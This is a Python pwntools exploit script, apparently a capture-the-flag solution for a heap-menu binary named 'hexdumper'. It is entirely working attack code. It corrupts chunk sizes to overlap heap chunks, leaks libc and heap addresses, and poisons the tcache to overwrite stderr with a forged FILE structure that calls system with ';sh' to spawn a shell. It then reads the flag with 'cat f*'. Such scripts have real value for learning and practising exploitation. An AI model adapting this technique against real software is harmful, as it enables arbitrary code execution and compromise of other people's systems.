from os import environ
from pwn import *
from pwnlib.elf.elf import emulate_plt_instructions

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./hexdumper"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()



def create(s):
    io.sendlineafter("==> ", b"1")
    io.sendlineafter("Dump size: ", str(s))

def dump(idx):
    io.sendlineafter("==> ", b"2")
    io.sendlineafter("Dump index: ", str(idx))

def _change(idx, offset, v):
    io.sendlineafter("==> ", b"3")
    io.sendlineafter("Dump index: ", str(idx))
    io.sendlineafter("Offset: ", str(offset))
    io.sendlineafter("Value in decimal: ", str(v))

def change(idx, offset, v):
    for i, b in enumerate(v):
        _change(idx, offset+i, b )


def merge(idx1, idx2):
    io.sendlineafter("==> ", b"4")
    io.sendlineafter("Dump index: ", str(idx1))
    io.sendlineafter("Dump index: ", str(idx2))

def resize(idx, n):
    io.sendlineafter("==> ", b"5")
    io.sendlineafter("Dump index: ", str(idx))
    io.sendlineafter("New size: ", str(n))

def remove(idx):
    io.sendlineafter("==> ", b"6")
    io.sendlineafter("Dump index: ", str(idx))


main_arena = 0x7fbbecd34b20 - 0x7fbbecb23000
dumps = 0x04600
dump_size = 0x4820
free_got = 0x03F80
environ_offset = libc.symbols["environ"] # 0x218d78

create(0x10)
create(0x18)  # 1
create(0x210) # 2
create(0xe8)  # 3
create(0xe8)  # 4
create(0x10)
create(0x10)

change(0, 0, p64(0x421))
resize(0, 0)
merge(1, 0)

remove(2)
create(0x210)  # 此时3上面fd指向main_arena
dump(3)
io.recvuntil("0000 |   ", drop = True)
leak = io.recv(17).decode("utf-8")
leak = bytes.fromhex(leak.replace(' ', ''))
leak = u64(leak.ljust(8, b"\x00"))
libc.address = leak - main_arena
log.success("libc.address:-----> " + hex(libc.address))

create(0xe8)
remove(2)
dump(3)
io.recvuntil("0000 |   ", drop = True)
leak = io.recv(17).decode("utf-8")
leak = bytes.fromhex(leak.replace(' ', ''))
leak = u64(leak.ljust(8, b"\x00"))
heap = leak << 12
log.success("heap:-----> " + hex(heap))

create(0xe8)
create(0xe8)
remove(4)
remove(3)
stderr_adr = libc.symbols["_IO_2_1_stderr_"]
log.success("stderr:-----> " + hex(stderr_adr))

change(2, 0, p64(heap>>12 ^ stderr_adr))

file = FileStructure(0)
file.flags = u64(p32(0xfbad0101) + b";sh\0")
file._IO_save_end = libc.sym["system"]
file._lock = libc.sym["_IO_2_1_stderr_"] - 0x10
file._wide_data = libc.sym["_IO_2_1_stderr_"] - 0x10
file._offset = 0
file._old_offset = 0
payload = b"\x00"*24 + p32(1) + p32(0) + p64(0) 
payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10) 
payload += p64(libc.symbols["_IO_wfile_jumps"] + 0x18 - 0x58)
file.unknown2 = payload

log.success(hex(len(bytes(file))))
create(0xe8)
create(0xe8)
change(4, 0, bytes(file))

io.sendline(b"cat f*")
io.sendline(b"cat f*")
io.interactive()
